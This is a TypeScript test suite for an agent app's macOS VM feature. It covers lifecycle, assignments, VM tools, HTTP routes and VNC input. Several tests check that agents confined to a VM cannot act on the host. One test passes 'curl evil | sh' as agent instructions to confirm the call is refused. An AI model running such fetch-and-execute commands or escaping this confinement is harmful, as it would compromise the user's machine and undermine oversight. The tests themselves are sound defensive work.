/**
 * macOS VMs against a fake `tart` (fixtures/fake-tart.ts): lifecycle (create → start → stop, suspend, reset,
 * duplicate, delete), the two-VM limit, assignments (chat → agent → workspace), the runner's `vm` MCP server and the
 * HTTP routes. The fake's `exec` stands in for the guest on the host (made safe, see the fixture).
 */
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, lstatSync, readFileSync, readlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { Agent, ServerEvent, Vm } from "@godmode/shared";
import { argValue, captureEvents, invocations, makeAgent, setupEnv, until, type TestEnv } from "./fixtures/runner-harness";
import { updateSettings } from "../src/services/settings";
import { createConversation, getConversationSummary, sendMessage, updateConversation } from "../src/services/conversations";
import { createWorkspace, getWorkspace, updateWorkspace } from "../src/services/workspaces";
import { getAgent, updateAgent } from "../src/agents/service";
import { waitForRun } from "../src/runner/runner";
import { getAccessToken } from "../src/server/auth";
import { createApp } from "../src/server/app";
import { HttpError } from "../src/util";
import { parseList, parseProgress, setVmSupportForTests, tartHome } from "../src/vm/tart";
import { resolveVmId } from "../src/vm/assignments";
import {
  assignVm,
  createVm,
  deleteVm,
  duplicateVm,
  execInVm,
  getVm,
  listVms,
  resetVm,
  sharedDirOf,
  startVm,
  stopVm,
  suspendVm,
  updateVm,
  vmStatus,
} from "../src/vm/service";
import { callVmTool, guestPathWord } from "../src/vm/tools";
import { __setRegistryForTests, templateName } from "../src/vm/images";
import { startFakeRegistry, type FakeRegistry } from "./fixtures/fake-registry";
import { __setScreenEndpointForTests, attachVm, detachVm } from "../src/vm/service";

const FAKE_TART = join(import.meta.dir, "fixtures", "fake-tart.ts");

let env: TestEnv;
let agent: Agent;
let registry: FakeRegistry;

function fakeState(): {
  images: string[];
  vms: Record<string, { state: string; cpu: number; memory: number; display: string; disk: number; generation: number; macRandomized: number; screenPort?: number }>;
} {
  return JSON.parse(readFileSync(join(tartHome(), "fake-state.json"), "utf8"));
}

async function waitState(id: string, state: Vm["state"], timeoutMs = 20_000): Promise<Vm> {
  let vm = await getVm(id);
  const start = Date.now();
  while (vm.state !== state) {
    if (Date.now() - start > timeoutMs) throw new Error(`VM ${id} stayed ${vm.state} (wanted ${state}; error: ${vm.error})`);
    await Bun.sleep(50);
    vm = await getVm(id);
  }
  return vm;
}

async function catchHttp(p: Promise<unknown>): Promise<HttpError> {
  try {
    await p;
  } catch (err) {
    if (err instanceof HttpError) return err;
    throw err;
  }
  throw new Error("expected an HttpError");
}

beforeAll(async () => {
  env = await setupEnv("godmode-vms-");
  // A wrapper script: settings.vm.tartPath must be one executable file.
  const wrapper = join(env.dataDir, "tart");
  writeFileSync(wrapper, `#!/bin/sh\nexec "${process.execPath}" "${FAKE_TART}" "$@"\n`);
  chmodSync(wrapper, 0o755);
  updateSettings({ vm: { tartPath: wrapper, onQuit: "stop" } });
  process.env.FAKE_TART_PULL_MS = "200";
  process.env.FAKE_TART_BOOT_FAILS = "0";
  setVmSupportForTests(true);
  // Every registry (ghcr.io, …) is the fake one.
  registry = startFakeRegistry();
  __setRegistryForTests(() => `http://${registry.host}`);
  // The fake VMs serve their screen on a local port (a real VM: the guest's Screen Sharing on its NAT address).
  __setScreenEndpointForTests((id) => {
    const port = fakeState().vms[id]?.screenPort;
    return port ? { host: "127.0.0.1", port, username: "admin", password: "admin" } : null;
  });
  agent = await makeAgent({ name: "VM Worker" });
});

afterAll(async () => {
  for (const vm of await listVms()) await deleteVm(vm.id).catch(() => undefined);
  setVmSupportForTests(null);
  __setScreenEndpointForTests(null);
  __setRegistryForTests(null);
  registry.stop();
  await env.close();
});

describe("tart output parsing", () => {
  test("progress percentages", () => {
    expect(parseProgress("pulling disk (27.3 GB compressed)...\r 3%\r 42%")).toBe(42);
    expect(parseProgress("pulling manifest...")).toBeNull();
  });

  test("tart list JSON with numbers and humanized sizes", () => {
    const list = parseList(
      JSON.stringify([
        { Source: "local", Name: "a", Disk: 50, Size: 21.5, Accessed: "x", Running: true, State: "running" },
        { Source: "local", Name: "b", Disk: "100 GB", Size: "1.5 TB", Accessed: "x", Running: false, State: "suspended" },
        { Source: "local", Name: "c", Disk: 50, Size: 1, Running: false },
      ]),
    );
    expect(list).toEqual([
      { name: "a", source: "local", state: "running", diskGb: 50, sizeBytes: 21_500_000_000 },
      { name: "b", source: "local", state: "suspended", diskGb: 100, sizeBytes: 1_500_000_000_000 },
      { name: "c", source: "local", state: "stopped", diskGb: 50, sizeBytes: 1_000_000_000 },
    ]);
    expect(parseList("not json")).toEqual([]);
  });

  test("guest paths become safe shell words", () => {
    expect(guestPathWord("/tmp/a b")).toBe("'/tmp/a b'");
    expect(guestPathWord("~/x'y")).toBe(`"$HOME"/'x'\\''y'`);
    expect(guestPathWord("proj/file")).toBe(`"$HOME"/'proj/file'`);
    expect(guestPathWord("~")).toBe('"$HOME"');
  });
});

describe("VM lifecycle", () => {
  let vmId = "";

  test("status: tart found, presets not downloaded yet", async () => {
    const status = await vmStatus();
    expect(status.supported).toBe(true);
    expect(status.tart.installed).toBe(true);
    expect(status.tart.version).toBe("2.40.0");
    expect(status.maxRunning).toBe(2);
    expect(status.images.find((i) => i.recommended)?.downloaded).toBe(false);
  });

  test("create downloads the image, clones it and applies the settings", async () => {
    const { events, stop } = captureEvents();
    const vm = await createVm({ name: "  Build   Mac ", cpu: 2, memoryMb: 4096, display: "1280x800" });
    vmId = vm.id;
    expect(vm.name).toBe("Build Mac");
    expect(vm.state).toBe("creating");
    expect(vm.sharedDir).toBe(sharedDirOf(vm.id));
    expect(existsSync(vm.sharedDir)).toBe(true);
    const ready = await waitState(vm.id, "stopped");
    stop();
    expect(ready.error).toBeNull();
    const updates = events.filter((e): e is Extract<ServerEvent, { type: "vm.updated" }> => e.type === "vm.updated" && e.vm.id === vm.id);
    expect(updates.some((e) => e.vm.progress?.phase === "download")).toBe(true);
    expect(updates.some((e) => e.vm.progress?.phase === "clone")).toBe(true);
    const fake = fakeState().vms[vm.id]!;
    expect(fake).toMatchObject({ cpu: 2, memory: 4096, display: "1280x800", disk: 50, macRandomized: 1 });
    expect((await vmStatus()).images.find((i) => i.recommended)?.downloaded).toBe(true);
    // Downloaded in parts, resumed after a dropped connection, unpacked through the loopback registry into a template.
    const [big] = registry.layers;
    const { createHash } = await import("node:crypto");
    const bigDigest = `sha256:${createHash("sha256").update(big!).digest("hex")}`;
    expect(registry.requests.filter((r) => r.digest === bigDigest).map((r) => r.range)).toEqual([null, `bytes=${big!.length / 2}-`]);
    expect(fakeState().vms[templateName(vm.image)]).toBeDefined();
    expect(fake.source).toBe(templateName(vm.image));
    expect(fakeState().images).toEqual([]); // the loopback copy is removed once the template exists
    const { readdirSync } = await import("node:fs");
    expect(readdirSync(join(env.dataDir, "vm", "downloads"))).toEqual([]);
    // The next VM from the same image doesn't download anything.
    const before = registry.requests.length;
    const again = await createVm({ name: "Second from image" });
    await waitState(again.id, "stopped");
    expect(registry.requests.length).toBe(before);
    await deleteVm(again.id);
  });

  test("bad input is rejected", async () => {
    expect((await catchHttp(createVm({ name: " " }))).status).toBe(400);
    expect((await catchHttp(createVm({ name: "x", image: "not an image!" }))).status).toBe(400);
    expect((await catchHttp(createVm({ name: "x", display: "big" }))).status).toBe(400);
    expect((await catchHttp(createVm({ name: "x", cpu: 999 }))).status).toBe(400);
  });

  test("start boots, reads the VNC address, sets the guest up", async () => {
    process.env.FAKE_TART_BOOT_FAILS = "1"; // the guest agent answers on the second probe
    try {
      await startVm(vmId);
    } finally {
      process.env.FAKE_TART_BOOT_FAILS = "0";
    }
    const vm = await getVm(vmId);
    expect(vm.state).toBe("running");
    expect(vm.ip).toMatch(/^192\.168\.64\.\d+$/);
    expect(vm.lastStartedAt).not.toBeNull();
    // Setup linked the shared folder into the guest's home.
    const link = join(tartHome(), "guest-home", "Godmode");
    expect(lstatSync(link).isSymbolicLink()).toBe(true);
    expect(readlinkSync(link)).toBe(vm.sharedDir);
    // …and authorized Godmode's SSH key.
    expect(readFileSync(join(tartHome(), "guest-home", ".ssh", "authorized_keys"), "utf8")).toContain("godmode-vm");
  });

  test("exec runs commands in the guest and sees the shared folder", async () => {
    writeFileSync(join(sharedDirOf(vmId), "from-host.txt"), "hi from the host");
    const res = await execInVm(vmId, "cat ~/Godmode/from-host.txt && echo && echo err >&2 && exit 4");
    expect(res).toMatchObject({ exitCode: 4, stdout: "hi from the host\n", stderr: "err\n", timedOut: false });
    const stdin = await execInVm(vmId, "cat > ~/Godmode/from-vm.txt", { stdin: "made in the VM" });
    expect(stdin.exitCode).toBe(0);
    expect(readFileSync(join(sharedDirOf(vmId), "from-vm.txt"), "utf8")).toBe("made in the VM");
  });

  test("the disk can only grow, and not while running", async () => {
    expect((await catchHttp(updateVm(vmId, { diskGb: 40 }))).status).toBe(400);
    expect((await catchHttp(updateVm(vmId, { diskGb: 80 }))).status).toBe(409);
    const renamed = await updateVm(vmId, { name: "Builder", cpu: 3 });
    expect(renamed.name).toBe("Builder");
    expect(fakeState().vms[vmId]!.cpu).toBe(3);
  });

  test("macOS allows two VMs at a time", async () => {
    const second = await createVm({ name: "Second" });
    const third = await createVm({ name: "Third" });
    await waitState(second.id, "stopped");
    await waitState(third.id, "stopped");
    await startVm(second.id);
    const err = await catchHttp(startVm(third.id));
    expect(err.status).toBe(409);
    expect(err.message).toContain("at most 2");
    expect(err.message).toContain('"Builder"');
    await stopVm(second.id);
    await deleteVm(second.id);
    await deleteVm(third.id);
  });

  test("suspend, then start resumes; stop shuts down", async () => {
    const suspended = await suspendVm(vmId);
    expect(suspended.state).toBe("suspended");
    expect(suspended.ip).toBeNull();
    await startVm(vmId);
    expect((await getVm(vmId)).state).toBe("running");
    const stopped = await stopVm(vmId);
    expect(stopped.state).toBe("stopped");
  });

  test("duplicate copies a stopped VM with a new identity", async () => {
    await startVm(vmId);
    expect((await catchHttp(duplicateVm(vmId))).status).toBe(409);
    await stopVm(vmId);
    const copy = await duplicateVm(vmId);
    expect(copy.name).toBe("Builder copy");
    expect(copy.id).not.toBe(vmId);
    expect(copy.assignments).toEqual([]);
    expect(fakeState().vms[copy.id]).toMatchObject({ cpu: 3, source: vmId, macRandomized: 1 });
    await deleteVm(copy.id);
    expect(fakeState().vms[copy.id]).toBeUndefined();
  });

  test("reset recreates the disk from the image and keeps the shared folder", async () => {
    const before = fakeState().vms[vmId]!.generation;
    writeFileSync(join(sharedDirOf(vmId), "keep.txt"), "keep me");
    expect((await resetVm(vmId)).state).toBe("creating");
    const vm = await waitState(vmId, "stopped");
    expect(vm.error).toBeNull();
    expect(fakeState().vms[vmId]!.generation).toBeGreaterThan(before);
    expect(fakeState().vms[vmId]!.cpu).toBe(3);
    expect(readFileSync(join(sharedDirOf(vmId), "keep.txt"), "utf8")).toBe("keep me");
  });

  test("a VM whose disk vanished is reported and can be reset", async () => {
    const vm = await createVm({ name: "Fragile" });
    await waitState(vm.id, "stopped");
    Bun.spawnSync([join(env.dataDir, "tart"), "delete", vm.id], { env: { ...process.env, TART_HOME: tartHome() } });
    const broken = await waitState(vm.id, "error");
    expect(broken.error).toContain("disk is missing");
    expect((await catchHttp(startVm(vm.id))).status).toBe(409);
    await resetVm(vm.id);
    expect((await waitState(vm.id, "stopped")).error).toBeNull();
    await deleteVm(vm.id);
  });

  test("operations don't trip over each other", async () => {
    const vm = await createVm({ name: "Busy" });
    // Busy while it's created.
    expect((await catchHttp(updateVm(vm.id, { cpu: 2 }))).status).toBe(409);
    expect((await catchHttp(startVm(vm.id))).message).toContain("still being created");
    await waitState(vm.id, "stopped");

    // A stop right after a start wins: the start gives up and nothing is left running.
    const starting = startVm(vm.id).then(
      () => "started",
      (err: Error) => err.message,
    );
    expect((await getVm(vm.id)).state).toBe("starting");
    expect((await catchHttp(resetVm(vm.id))).status).toBe(409);
    expect((await catchHttp(suspendVm(vm.id))).status).toBe(409);
    await stopVm(vm.id);
    expect(await starting).toContain("stopped while it was starting");
    expect((await getVm(vm.id)).state).toBe("stopped");
    expect(fakeState().vms[vm.id]!.state).toBe("stopped");

    // Two starts share one boot.
    const [a, b] = [startVm(vm.id), startVm(vm.id)];
    expect(a).toBe(b);
    await a;

    // A suspended VM keeps its hardware (changing it would lose the saved session); renaming is fine.
    await suspendVm(vm.id);
    expect((await catchHttp(updateVm(vm.id, { memoryMb: 4096 }))).message).toContain("suspended");
    expect((await updateVm(vm.id, { name: "Busy bee" })).name).toBe("Busy bee");
    await startVm(vm.id);
    expect((await getVm(vm.id)).state).toBe("running");

    // Ending a run cancels its VM calls.
    await attachVm("run_abort", vm.id);
    const { runSignal } = await import("../src/vm/service");
    const slow = execInVm(vm.id, "sleep 20; echo done", { signal: runSignal("run_abort"), timeoutMs: 60_000 });
    await Bun.sleep(300);
    const t0 = Date.now();
    detachVm("run_abort");
    const res = await slow;
    expect(Date.now() - t0).toBeLessThan(5000);
    expect(res.exitCode).toBeNull();
    expect(res.stdout).not.toContain("done");

    await stopVm(vm.id);
    await deleteVm(vm.id);
  });

  test("a VM that fails to boot reports why (and doesn't hang)", async () => {
    const vm = await createVm({ name: "Won't boot" });
    await waitState(vm.id, "stopped");
    process.env.FAKE_TART_RUN_FAIL = "1";
    try {
      const started = Date.now();
      await expect(startVm(vm.id)).rejects.toThrow("the disk image is corrupted");
      expect(Date.now() - started).toBeLessThan(15_000);
    } finally {
      delete process.env.FAKE_TART_RUN_FAIL;
    }
    const after = await getVm(vm.id);
    expect(after.state).toBe("stopped");
    expect(after.error).toContain("the disk image is corrupted");
    // The next start works and clears the error.
    await startVm(vm.id);
    expect((await getVm(vm.id)).error).toBeNull();
    await stopVm(vm.id);
    await deleteVm(vm.id);
  });

  test("custom Linux images boot without macOS-only options", async () => {
    process.env.FAKE_TART_OS = "linux";
    try {
      const vm = await createVm({ name: "Linux box", image: "ghcr.io/cirruslabs/debian:latest" });
      await waitState(vm.id, "stopped");
      await startVm(vm.id);
      expect((await getVm(vm.id)).state).toBe("running");
      expect((await catchHttp(suspendVm(vm.id))).message).toContain("Only macOS VMs");
      await stopVm(vm.id);
      await deleteVm(vm.id);
    } finally {
      delete process.env.FAKE_TART_OS;
    }
  });

  test("images from registries that need a login are pulled by tart itself", async () => {
    const vm = await createVm({ name: "Private", image: "ghcr.io/private/macos:latest" });
    await waitState(vm.id, "stopped");
    expect(fakeState().images).toContain("ghcr.io/private/macos:latest");
    expect(fakeState().vms[vm.id]!.source).toBe(templateName("ghcr.io/private/macos:latest"));
    await deleteVm(vm.id);
  });

  test("a failed download leaves an error", async () => {
    const vm = await createVm({ name: "Broken", image: "ghcr.io/example/does-not-exist:latest" });
    const failed = await waitState(vm.id, "error");
    expect(failed.error).toContain("404");
    await deleteVm(vm.id);
  });
});

describe("assignments", () => {
  test("chat → agent → workspace; delete clears them", async () => {
    const a = await createVm({ name: "A" });
    const b = await createVm({ name: "B" });
    const c = await createVm({ name: "C" });
    const ws = createWorkspace({ name: "VM Space" });
    const member = await makeAgent({ name: "Member", workspaceId: ws.id });
    const conv = createConversation({ agentId: member.id });
    expect(resolveVmId(conv.id, getAgent(member.id))).toBeNull();

    updateWorkspace(ws.id, { vmId: c.id });
    expect(getWorkspace(ws.id).vmId).toBe(c.id);
    expect(resolveVmId(conv.id, getAgent(member.id))).toBe(c.id);

    await updateAgent(member.id, { vmId: b.id });
    expect(resolveVmId(conv.id, getAgent(member.id))).toBe(b.id);

    updateConversation(conv.id, { vmId: a.id });
    expect(getConversationSummary(conv.id).vmId).toBe(a.id);
    expect(resolveVmId(conv.id, getAgent(member.id))).toBe(a.id);

    expect((await getVm(c.id)).assignments).toEqual([{ kind: "workspace", id: ws.id, name: "VM Space" }]);
    expect((await getVm(b.id)).assignments).toEqual([{ kind: "agent", id: member.id, name: "Member" }]);
    expect((await getVm(a.id)).assignments.map((x) => x.kind)).toEqual(["conversation"]);

    await deleteVm(a.id);
    expect(getConversationSummary(conv.id).vmId).toBeNull();
    expect(resolveVmId(conv.id, getAgent(member.id))).toBe(b.id);

    // Assign/unassign from the VM's side.
    const viaVm = await assignVm(c.id, { kind: "agent", id: member.id, assigned: true });
    expect(viaVm.assignments.map((x) => x.kind).sort()).toEqual(["agent", "workspace"]);
    await assignVm(b.id, { kind: "agent", id: member.id, assigned: false }); // not b's anymore: no change
    expect(getAgent(member.id).vmId).toBe(c.id);
    await assignVm(c.id, { kind: "agent", id: member.id, assigned: false });
    expect(getAgent(member.id).vmId).toBeNull();

    // Unknown VM ids are rejected. Agents may move an agent into a VM, but only the human takes it out again.
    expect(() => updateConversation(conv.id, { vmId: "vm_nope" })).toThrow("doesn't exist");
    await updateAgent(member.id, { vmId: c.id }, `agent:${agent.id}`);
    expect(getAgent(member.id).vmId).toBe(c.id);
    await updateAgent(member.id, { vmId: null }, `agent:${agent.id}`);
    expect(getAgent(member.id).vmId).toBe(c.id);
    expect((await catchHttp(assignVm(c.id, { kind: "agent", id: member.id, assigned: false }, `agent:${agent.id}`))).status).toBe(403);
    await updateAgent(member.id, { vmId: null });
    expect(getAgent(member.id).vmId).toBeNull();

    await deleteVm(b.id);
    await deleteVm(c.id);
    expect(getWorkspace(ws.id).vmId).toBeNull();
  });
});

describe("the orchestrator's VM tools", () => {
  test("list, create, assign and power VMs; managers only", async () => {
    const { callTool, listToolsFor } = await import("../src/mcp/tools");
    const boss = await makeAgent({ name: "VM Boss", permissions: { canManageAgents: true } });
    const worker = await makeAgent({ name: "VM Helper" });
    const ctx = (a: Agent) => ({ runId: `run_${a.id}`, agentId: a.id, conversationId: createConversation({ agentId: a.id }).id, workspaceId: null, depth: 0 });
    const bossCtx = ctx(boss);
    const names = (a: Agent) => listToolsFor(getAgent(a.id), ctx(a)).map((t) => t.name);
    expect(names(boss)).toEqual(expect.arrayContaining(["vms_list", "vm_create", "vm_assign", "vm_power"]));
    expect(names(worker)).not.toContain("vm_create");
    const call = async (name: string, args: unknown) => {
      const r = (await callTool(bossCtx, name, args)) as { content: { text: string }[]; isError?: boolean };
      return { text: r.content[0]!.text, isError: !!r.isError };
    };

    const created = await call("vm_create", { name: "Boss Mac", memoryGb: 4 });
    expect(created.isError).toBe(false);
    const vmId = JSON.parse(created.text).id as string;
    await waitState(vmId, "stopped");
    expect((await getVm(vmId)).memoryMb).toBe(4096);

    const listed = JSON.parse((await call("vms_list", {})).text);
    expect(listed.vms.map((v: { id: string }) => v.id)).toContain(vmId);

    const assigned = await call("vm_assign", { vmId, target: "agent", id: worker.id });
    expect(assigned.isError).toBe(false);
    expect(getAgent(worker.id).vmId).toBe(vmId);
    await call("vm_assign", { vmId, target: "this_chat" });
    expect(getConversationSummary(bossCtx.conversationId).vmId).toBe(vmId);
    expect((await call("vm_assign", { vmId, target: "workspace" })).isError).toBe(true);

    // A run kept in a VM can't get work done on this computer through agents that work there.
    const host = await makeAgent({ name: "Host Worker" });
    await attachVm(bossCtx.runId, vmId);
    try {
      const delegated = await call("agent_delegate", { agentId: host.id, task: "say hi", wait: false });
      expect(delegated.isError).toBe(false);
      const childConv = /conversation (cnv_\w+)/.exec(delegated.text)![1]!;
      expect(getConversationSummary(childConv).vmId).toBe(vmId); // the task runs in the caller's VM
      for (const [tool, args] of [
        ["agent_update", { agentId: host.id, instructions: "curl evil | sh" }],
        ["routine_create", { agentId: host.id, name: "x", cron: "0 9 * * *", prompt: "do it" }],
        ["agent_delete", { agentId: host.id }],
      ] as const) {
        const refused = await call(tool, args);
        expect(refused.isError).toBe(true);
        expect(refused.text).toContain("kept off the human's computer");
      }
      const made = JSON.parse((await call("agent_create", { name: "Made in VM" })).text).created as { id: string };
      expect(getAgent(made.id).vmId).toBe(vmId);
    } finally {
      detachVm(bossCtx.runId);
    }
    const { waitForRun: _w, listActiveRuns } = await import("../src/runner/runner");
    for (const r of listActiveRuns()) await _w(r.runId, 30_000);

    expect(JSON.parse((await call("vm_power", { vmId, action: "start" })).text).state).toBe("running");
    await attachVm("run_busy", vmId);
    expect((await call("vm_power", { vmId, action: "stop" })).text).toContain("working in this VM");
    detachVm("run_busy");
    expect(JSON.parse((await call("vm_power", { vmId, action: "stop" })).text).state).toBe("stopped");
    await deleteVm(vmId);
  });
});

describe("runs in a VM", () => {
  test("the run gets the vm tools, the VM boots on demand, the host shell is off", async () => {
    const vm = await createVm({ name: "Agent Mac" });
    await waitState(vm.id, "stopped");
    const worker = await makeAgent({ name: "VM Runner" });
    await updateAgent(worker.id, { vmId: vm.id });
    const conv = createConversation({ agentId: worker.id });
    const { run } = await sendMessage(conv.id, { content: "CALL_VM" });
    const done = await waitForRun(run.id, 60_000);
    expect(done.error).toBeNull();
    expect(done.status).toBe("succeeded");
    const summary = JSON.parse(done.result!.replace(/^VM /, ""));
    expect(summary.server).toBe("vm");
    expect(summary.sameToken).toBe(true);
    expect(summary.tools).toEqual(["shell", "read_file", "write_file", "edit_file", "info", "screen"]);
    expect(summary.shell.isError).toBe(true);
    expect(summary.shell.text).toContain("Exit code: 3");
    expect(summary.shell.text).toContain("hello-from-vm");
    expect(summary.shell.text).toContain("[stderr]\noops");
    expect(summary.write).toEqual({ text: "Wrote 11 bytes to project/notes.txt.", isError: false });
    expect(summary.edit).toEqual({ text: "Edited project/notes.txt (1 replacement).", isError: false });
    expect(summary.read.text).toBe("1\talpha\n2\tgamma");
    expect(summary.cwd.text).toContain(join(tartHome(), "guest-home", "project"));
    expect((await getVm(vm.id)).state).toBe("running");

    const inv = invocations(env).filter((i) => i.prompt.includes("CALL_VM")).pop()!;
    const prompt = argValue(inv, "--append-system-prompt")!;
    expect(prompt).toContain("### macOS virtual machine");
    expect(prompt).toContain('**Agent Mac**');
    expect(prompt).toContain(sharedDirOf(vm.id));
    expect(argValue(inv, "--disallowedTools")).toContain("Bash");
    // Kept off the host: no bypass (file tools only reach cwd + --add-dir), the VM tools are allowed.
    expect(inv.args).not.toContain("--dangerously-skip-permissions");
    expect(argValue(inv, "--permission-mode")).toBe("acceptEdits");
    expect(argValue(inv, "--allowedTools")).toContain("mcp__vm");
    expect(inv.args.filter((a, i) => inv.args[i - 1] === "--add-dir")).toContain(sharedDirOf(vm.id));

    // Resumed turns restate the VM.
    const second = await waitForRun((await sendMessage(conv.id, { content: "hello again" })).run.id, 30_000);
    expect(second.status).toBe("succeeded");
    const resumed = invocations(env).filter((i) => i.prompt.includes("hello again")).pop()!;
    expect(resumed.prompt).toContain('You work in the macOS VM "Agent Mac"');

    // With the host shell allowed, Bash stays.
    updateSettings({ vm: { isolateHostShell: false } });
    try {
      await waitForRun((await sendMessage(conv.id, { content: "CALL_VM again" })).run.id, 30_000);
      const again = invocations(env).filter((i) => i.prompt.includes("CALL_VM again")).pop()!;
      expect(argValue(again, "--disallowedTools") ?? "").not.toContain("Bash");
      expect(again.args).toContain("--dangerously-skip-permissions");
    } finally {
      updateSettings({ vm: { isolateHostShell: true } });
    }

    // VMs turned off: work meant for the VM doesn't fall back to this computer.
    updateSettings({ vm: { enabled: false } });
    try {
      const off = await waitForRun((await sendMessage(conv.id, { content: "CALL_VM off" })).run.id, 30_000);
      expect(off.status).toBe("failed");
      expect(off.error).toContain("virtual machines are turned off");
    } finally {
      updateSettings({ vm: { enabled: true } });
    }
    await stopVm(vm.id);
    await deleteVm(vm.id);
  });

  test("a VM that can't be used fails the run with a clear message", async () => {
    const vm = await createVm({ name: "Not yet", image: "ghcr.io/example/does-not-exist:latest" });
    await waitState(vm.id, "error");
    const worker = await makeAgent({ name: "Blocked Runner" });
    await updateAgent(worker.id, { vmId: vm.id });
    const conv = createConversation({ agentId: worker.id });
    const done = await waitForRun((await sendMessage(conv.id, { content: "CALL_VM" })).run.id, 30_000);
    expect(done.status).toBe("failed");
    expect(done.error).toContain("The virtual machine can't be used");
    await deleteVm(vm.id);
  });

  test("a run without a VM has no vm server", async () => {
    const conv = createConversation({ agentId: agent.id });
    const done = await waitForRun((await sendMessage(conv.id, { content: "CALL_VM" })).run.id, 30_000);
    expect(done.result).toBe("no vm server");
  });
});

describe("the VM screen", () => {
  test("screenshots and input over VNC, mapped from screenshot pixels to the screen", async () => {
    const vm = await createVm({ name: "Screen Mac" });
    await waitState(vm.id, "stopped");
    const ctx = { runId: "run_screen_test", agentId: agent.id, conversationId: "cnv_x", workspaceId: null, depth: 0 };
    // Not attached: no VM for this run.
    expect((await callVmTool(ctx, "screen", { action: "screenshot" })).isError).toBe(true);
    await attachVm(ctx.runId, vm.id);
    try {
      const needsShot = await callVmTool(ctx, "screen", { action: "left_click", coordinate: [5, 5] });
      expect(needsShot.isError).toBe(true);
      expect((needsShot.content[0] as { text: string }).text).toContain("Take a screenshot first");

      updateSettings({ computer: { screenshotMaxSize: 64 } }); // the fake screen is 128×96: screenshots are scaled ×0.5
      const shot = await callVmTool(ctx, "screen", { action: "screenshot" });
      expect(shot.isError).toBeUndefined();
      const image = shot.content.find((c) => c.type === "image") as { data: string; mimeType: string };
      expect(image.mimeType).toBe("image/png");
      const { imageSize } = await import("../src/computer/image");
      expect(imageSize(image.data)).toMatchObject({ width: 64, height: 48 });

      const eventsFile = join(tartHome(), "vnc-events.jsonl");
      const events = () =>
        existsSync(eventsFile)
          ? readFileSync(eventsFile, "utf8").trim().split("\n").map((l) => JSON.parse(l) as { vm: string; type: string; x?: number; y?: number; buttons?: number; key?: number; down?: boolean }).filter((e) => e.vm === vm.id)
          : [];
      const clicked = await callVmTool(ctx, "screen", { action: "left_click", coordinate: [10, 5], screenshot: false });
      expect((clicked.content[0] as { text: string }).text).toBe("left click at [10, 5].");
      await until(() => events().some((e) => e.type === "pointer" && e.buttons === 1), 5000, "click");
      const press = events().find((e) => e.type === "pointer" && e.buttons === 1)!;
      expect([press.x, press.y]).toEqual([20, 10]);

      await callVmTool(ctx, "screen", { action: "type", text: "Hi", screenshot: false });
      await callVmTool(ctx, "screen", { action: "key", text: "cmd+s", screenshot: false });
      await until(() => events().filter((e) => e.type === "key").length >= 10, 5000, "keys");
      const keys = events().filter((e) => e.type === "key").map((e) => `${e.down ? "+" : "-"}${e.key!.toString(16)}`);
      // "H" holds shift (0xffe1), "i" doesn't; cmd+s holds cmd (0xffeb).
      expect(keys.slice(0, 10)).toEqual(["+ffe1", "+48", "-48", "-ffe1", "+69", "-69", "+ffeb", "+73", "-73", "-ffeb"]);

      const bad = await callVmTool(ctx, "screen", { action: "left_click", coordinate: [500, 5] });
      expect(bad.isError).toBe(true);
      expect((bad.content[0] as { text: string }).text).toContain("outside your latest screenshot");
    } finally {
      updateSettings({ computer: { screenshotMaxSize: 1280 } });
      detachVm(ctx.runId);
    }
    await stopVm(vm.id);
    await deleteVm(vm.id);
  });
});

describe("HTTP routes", () => {
  test("status, create, list, start/stop, exec, assign, delete", async () => {
    const app = createApp();
    const token = getAccessToken();
    const call = async (method: string, path: string, body?: unknown) => {
      const res = await app.request(path, {
        method,
        headers: { Authorization: `Bearer ${token}`, ...(body !== undefined ? { "Content-Type": "application/json" } : {}) },
        body: body !== undefined ? JSON.stringify(body) : undefined,
      });
      return { status: res.status, json: (await res.json()) as Record<string, unknown> & Vm };
    };
    const status = await call("GET", "/api/vms/status");
    expect(status.status).toBe(200);
    expect(status.json.supported).toBe(true);

    const created = await call("POST", "/api/vms", { name: "Route VM", image: "tahoe" });
    expect(created.status).toBe(201);
    expect(created.json.image).toBe("ghcr.io/cirruslabs/macos-tahoe-base:latest");
    const id = created.json.id;
    await waitState(id, "stopped");

    expect((await call("POST", "/api/vms", { name: "" })).status).toBe(400);
    expect((await call("GET", "/api/vms")).json).toBeArray();

    const started = await call("POST", `/api/vms/${id}/start`, {});
    expect(started.status).toBe(200);
    await waitState(id, "running");

    const exec = await call("POST", `/api/vms/${id}/exec`, { command: "echo route" });
    expect(exec.json).toMatchObject({ exitCode: 0, stdout: "route\n" });

    const assigned = await call("POST", `/api/vms/${id}/assign`, { kind: "agent", id: agent.id, assigned: true });
    expect(assigned.json.assignments).toEqual([{ kind: "agent", id: agent.id, name: agent.name }]);

    expect((await call("POST", `/api/vms/${id}/stop`, {})).json.state).toBe("stopped");
    expect((await call("DELETE", `/api/vms/${id}?keepFiles=1`)).status).toBe(200);
    expect(existsSync(sharedDirOf(id))).toBe(true);
    expect((await call("GET", `/api/vms/${id}`)).status).toBe(404);
    expect(getAgent(agent.id).vmId).toBeNull();
  });
});
